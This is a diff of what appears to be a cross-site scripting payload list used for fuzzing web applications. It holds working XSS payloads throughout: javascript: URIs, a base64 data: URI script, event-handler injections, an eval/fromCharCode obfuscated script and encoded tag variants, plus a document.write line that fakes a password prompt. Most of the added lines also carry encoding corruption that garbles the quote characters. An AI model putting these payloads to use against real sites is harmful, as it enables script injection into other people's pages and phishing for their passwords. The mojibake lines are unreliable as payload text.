@@ -32,7 +32,7 @@
 <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnQ3Jvc3NfU2l0ZV9TY3JpcHRpbmdfRm91bmQnKTwvc2NyaXB0Pg==">Alert</a>
 <iframe src="javascript:alert('Cross_Site_Scripting_Found')">
 <object data=javascript:alert('Cross_Site_Scripting_Found')>
-<iframe src=javascript:alert('Cross_Site_Scripting_Found')>
+<iframe src=javascript:alert('Cross_Site_Scripting_Found1')>
 <embed src=javascript:alert('Cross_Site_Scripting_Found')>
 "><script/n>alert("Cross_Site_Scripting_Found") </script> 
 "><script/n>eval(String.fromCharCode(97,108,101,114,116,40,34,67,114,111,115,115,95,83,105,116,101,95,83,99,114,105,112,116,105,110,103,34,41))</script>
@@ -57,7 +57,7 @@
 <body onmousemove=alert("Cross_Site_Scripting_Found")>
 <script>document.write("Enter your password to contiune<input type=password/>")</script>
 "><IFRAME SRC="javascript:alert("JamalC0m_Groups");"></IFRAME>
-%uff1cscript%uff1ealert(‘XSS’);%uff1c/script%uff1e -- .net
+%uff1cscript%uff1ealert(â€˜XSSâ€™);%uff1c/script%uff1e -- .net
 "><script>"
 "><script>alert("XSS")</script>
 "><script>alert(99)</script>
@@ -136,13 +136,13 @@
 \";alert('XSS');//
 \";alert('XSS');//
 a"onmouseover="alert(216)"
-¼script¾alert(¢XSS¢)¼/script¾
-“onload=alert(1)//’
-“onMouseOver=alert(1)//’
+Â¼scriptÂ¾alert(Â¢XSSÂ¢)Â¼/scriptÂ¾
+â€œonload=alert(1)//â€™
+â€œonMouseOver=alert(1)//â€™
 %u3008script%u3009alert(1)%u3008/script%u3009
 <video src=1 onerror=alert(1);
 <ScRiPt>alert(1)</ScRiPt>
-¼script¾alert(¢XSS¢)¼/script¾
+Â¼scriptÂ¾alert(Â¢XSSÂ¢)Â¼/scriptÂ¾
 %253CScRipT%253Ealert(0)%253C%252FScRipT%253E
 1'+eval('alert(1)')
 <%tag style=xss:expression(alert(1))>
@@ -150,6 +150,6 @@ a"onmouseover="alert(216)"
 <img[%09]onerror=alert(1) src=a>
 <img[%0d]onerror=alert(1) src=a>
 <img[%0a]onerror=alert(1) src=a>
-<img/”onerror=alert(1) src=a>
-<img/’onerror=alert(1) src=a>
+<img/â€onerror=alert(1) src=a>
+<img/â€™onerror=alert(1) src=a>
 <img/anyjunk/onerror=alert(1) src=a>
